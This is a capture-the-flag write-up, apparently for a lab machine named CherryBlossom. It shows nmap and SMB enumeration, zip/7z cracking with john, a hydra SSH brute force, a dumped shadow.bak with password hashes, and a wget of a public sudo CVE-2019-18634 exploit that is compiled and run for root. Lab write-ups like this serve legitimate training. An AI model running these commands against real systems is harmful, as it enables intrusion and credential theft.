@@ -1,0 +1,302 @@
+CherryBlossom
+
+NMAP RESULTS:
+
+Nmap scan report for 10.10.197.245
+Host is up, received reset ttl 63 (0.16s latency).
+Scanned at 2021-05-25 00:22:51 EDT for 23s
+
+PORT    STATE SERVICE     REASON         VERSION
+22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 21:ee:30:4f:f8:f7:9f:32:6e:42:95:f2:1a:1a:04:d3 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKc/7PuGrQ4Lxftvthh93ErX7zaSQc1O0jgk/tcmxe9xkcl4psN8ZzUg7ca9yVWxjyyyFQtpqoPi0nUuSRfGSsoBGFYXXipf6uZZ3FSOtgiMVnxKNliFcZ9JHVgAlhsxON/TIcClWgKY5FkjKesWNQFliYD0AG1cT8pDIWVhxIUfD9z7ZBix9otYIcAzoDl2Zn+COX1ueYYEtsm3R0CThm3cSTUdyj43fTXxGSdfE2B5VZ5whnG2dy3mwHUDQJwEdrNfadVEbn4vaMTOHJHGsj9l5MBAcUoK0d+uUI0xi49C67KeOjEXLE3qFaZ3GutNjdk3PqoQCJ9K1bJI7jrSIr
+|   256 dc:fc:de:d6:ec:43:61:00:54:9b:7c:40:1e:8f:52:c4 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEeAGAJHeiLl1wlePWrIQHmVHJDtgIITUOAmMOHawS2XR772Sui65bkCtSqTzUHhXiKpCnSUnXs1iYDttfmhrmc=
+|   256 12:81:25:6e:08:64:f6:ef:f5:0c:58:71:18:38:a5:c6 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOHCtTOq99vqGAOB/7Yii6wfllmq7ml6kmEOrPeUurfX
+139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 5.4 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.2 - 4.9 (92%), Linux 3.4 - 3.10 (92%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.91%E=4%D=5/25%OT=22%CT=%CU=34050%PV=Y%DS=2%DC=T%G=N%TM=60AC7BB2%P=x86_64-pc-linux-gnu)
+SEQ(SP=100%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)
+OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)
+WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
+ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)
+T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
+IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 39.890 days (since Thu Apr 15 03:01:20 2021)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=256 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: Host: UBUNTU; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -19m56s, deviation: 34m37s, median: 2s
+| nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| Names:
+|   UBUNTU<00>           Flags: <unique><active>
+|   UBUNTU<03>           Flags: <unique><active>
+|   UBUNTU<20>           Flags: <unique><active>
+|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
+|   WORKGROUP<00>        Flags: <group><active>
+|   WORKGROUP<1d>        Flags: <unique><active>
+|   WORKGROUP<1e>        Flags: <group><active>
+| Statistics:
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 42812/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 9326/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 25344/udp): CLEAN (Failed to receive data)
+|   Check 4 (port 52229/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: cherryblossom
+|   NetBIOS computer name: UBUNTU\x00
+|   Domain name: \x00
+|   FQDN: cherryblossom
+|_  System time: 2021-05-25T05:23:12+01:00
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-05-25T04:23:12
+|_  start_date: N/A
+
+TRACEROUTE (using port 443/tcp)
+HOP RTT       ADDRESS
+1   163.57 ms 10.8.0.1
+2   163.62 ms 10.10.197.245
+
+
+
+CHECKING THE SMB SHARES:
+-----------------------------
+
+# smbclient -L ////10.10.197.245//
+Enter WORKGROUP\root's password: 
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	Anonymous       Disk      Anonymous File Server Share
+	IPC$            IPC       IPC Service (Samba 4.7.6-Ubuntu)
+SMB1 disabled -- no workgroup available
+┌──(root💀kali)-[~]
+└─# smbclient \\\\10.10.197.245\\Anonymous
+Enter WORKGROUP\root's password: 
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Feb  9 19:22:51 2020
+  ..                                  D        0  Sun Feb  9 12:48:18 2020
+  journal.txt                         N  3470998  Sun Feb  9 19:20:53 2020
+
+		10253588 blocks of size 1024. 4680236 blocks available
+smb: \> get journal.txt 
+getting file \journal.txt of size 3470998 as journal.txt (1191.4 KiloBytes/sec) (average 1191.4 KiloBytes/sec)
+smb: \> exit
+
+DOWNLOADING THIS FILE IN TO OUR SYSTEM
+---------------------------------------
+
+it a base64 hash which on decoding gives us a .png image
+after checking the hint, it gives us a tool named 'stego-tookit'
+
+after creating its docker container in my local machine
+i use the tool name 'stegpy' which extracts a hidden zip file from the .png image
+
+DIFFICULT PART TO THINK:
+--------------------------
+after trying to unzip the file, it says corrupted
+so i check the hexdump of the file and change the 'magic bytes' from png format to zip format
+-------------------------
+
+
+now trying to unzip it, it requires a password
+
+so i use 'zip2john' to crack the password:
+---------------------------------------------
+
+# john --wordlist=/usr/share/wordlists/rockyou.txt hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+september        (_journal.zip/Journal.ctz)
+1g 0:00:00:00 DONE (2021-05-25 02:28) 6.250g/s 25600p/s 25600c/s 25600C/s 123456..oooooo
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+
+after unzip the file, we got a another file named 'Journal.ctz' which is a 7zip archive
+
+on unziping also requires a passphrase, so using '7z2john.pl'(first download some libraries):
+-----------------------------------
+
+sudo apt update && sudo apt install lzma && sudo apt install liblzma-dev
+wget https://cpan.metacpan.org/authors/id/P/PM/PMQS/Compress-Raw-Lzma-2.093.tar.gz
+tar -xvzf Compress-Raw-Lzma-2.093.tar.gz && cd Compress-Raw-Lzma-2.093
+perl MakeFile.PL && make && make test && make install
+
+-----------------------------------
+
+then use this tool to make a hash then use 'john' to crack the password
+(first locate 7z2john.pl then use the full path to execute the file)
+--------------------------------
+
+# john --wordlist=/usr/share/wordlists/rockyou.txt  hash-7z 
+Using default input encoding: UTF-8
+Loaded 1 password hash (7z, 7-Zip [SHA256 128/128 SSE2 4x AES])
+Cost 1 (iteration count) is 524288 for all loaded hashes
+Cost 2 (padding size) is 5 for all loaded hashes
+Cost 3 (compression type) is 2 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:05:19 0.03% (ETA: 2021-06-07 18:26) 0g/s 14.92p/s 14.92c/s 14.92C/s wwwwww..magnum
+tigerlily        (Journal.ctz)
+1g 0:00:06:22 DONE (2021-05-25 02:52) 0.002611g/s 14.60p/s 14.60c/s 14.60C/s brownsugar..skeptron
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+------------------------------
+
+now unzip the file:
+------------------------
+
+we got XML file named 'Journal.ctd'
+cheking the file:
+
+# xmlparse Journal.ctd
+Journal.ctd:2: validity error : Validation failed: no DTD found !
+<cherrytree>
+           ^
+2021-05-25 03:06:32.164 xmlparse[10714:10714] Document is cherrytree
+
+first download cherrytree
+(already have it)
+
+
+-------------------------------------------
+1. after checking this file, it contains our first flag
+2. It is a diary
+3. Contains some wordlist(the main one is: 5-1-10731-cherry-blossom.list)
+4. Author talks about her girlfriend, Lily that she chooses some passwords from the wordlist
+--------------------------------------------
+
+
+We can assume that Lily chooses password for her SSH connection?
+Lets try to bruteforce it using hydra:
+-------------------------------------------
+
+# hydra -l lily -P 5-1-10731-cherry-blossom.list ssh://10.10.251.200
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-25 03:17:09
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 9923 login tries (l:1/p:9923), ~621 tries per task
+[DATA] attacking ssh://10.10.251.200:22/
+[STATUS] 177.00 tries/min, 177 tries in 00:01h, 9747 to do in 00:56h, 16 active
+[STATUS] 117.33 tries/min, 352 tries in 00:03h, 9574 to do in 01:22h, 16 active
+[22][ssh] host: 10.10.251.200   login: lily   password: Mr.$un$hin3
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 4 final worker threads did not complete until end.
+[ERROR] 4 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+---------------------------------------------
+
+GOT THE PASSWORD!!
+LETS SSH THE USER
+
+
+in '/var/backups' , the "shadow.bak" file is readable:
+lily@cherryblossom:/var/backups$ cat shadow.bak 
+root:$6$l81PobKw$DE0ra9mYvNY5rO0gzuJCCXF9p08BQ8ALp5clk/E6RwSxxrw97h2Ix9O6cpVHnq1ZUw3a/OCubATvANEv9Od9F1:18301:0:99999:7:::
+daemon:*:17647:0:99999:7:::
+bin:*:17647:0:99999:7:::
+sys:*:17647:0:99999:7:::
+=
+----[snip]---
+=
+gdm:*:17647:0:99999:7:::
+johan:$6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYmxsZG.vLALyf7kjsqYjwW391j1bue2/.SVm91uno5DUX7ob0:18301:0:99999:7:::
+lily:$6$3GPkY0ZP$6zlBpNWsBHgo6X5P7kI2JG6loUkZBIOtuOxjZpD71spVdgqM4CTXMFYVScHHTCDP0dG2rhDA8uC18/Vid3JCk0:18301:0:99999:7:::
+sshd:*:18301:0:99999:7:::
+
+
+
+LETS TRY TO CRACK THESE PASSWORDS
+(using the same wordlist we got earlier)
+(as we already have lily password and we definetely don't get the root that easy)
+--------------------------------
+
+# john --wordlist=5-1-10731-cherry-blossom.list hash 
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+##scuffleboo##   (johan)
+1g 0:00:00:23 DONE (2021-05-25 03:27) 0.04242g/s 421.0p/s 708.8c/s 708.8C/s #2lyric..#2little
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+GOT THE "johan" USER PASSWORD
+lets change to him
+
+GOT THE USER FLAG
+
+LETS CHECK WHAT SUDO CAN DO:
+---------------------------
+
+johan@cherryblossom:~$ sudo -l
+[sudo] password for johan: **************
+
+WHAT IS THIS, asterisk ??
+
+ABOUT EXPLOIT:
+---------------
+In Sudo before 1.8.26, if pwfeedback is enabled in /etc/sudoers, users can trigger a stack-based buffer overflow in the privileged sudo process.The attacker needs to deliver a long string to the stdin of getln() in tgetpass.c.
+
+DOWNLOADING THE EXPLOIT:
+---------------------------
+wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
+gcc -o exploit exploit.c
+
+TRANSFER THE FILE TO THE SERVER:
+EXECUTE IT
+
+
+WE ARE ROOT!!
+
+
+johan@cherryblossom:~$ chmod +x exploit 
+johan@cherryblossom:~$ ./exploit 
+[sudo] password for johan: 
+Sorry, try again.
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(johan),1003(devs)
+# 
+
+GOT THE ROOT FLAG
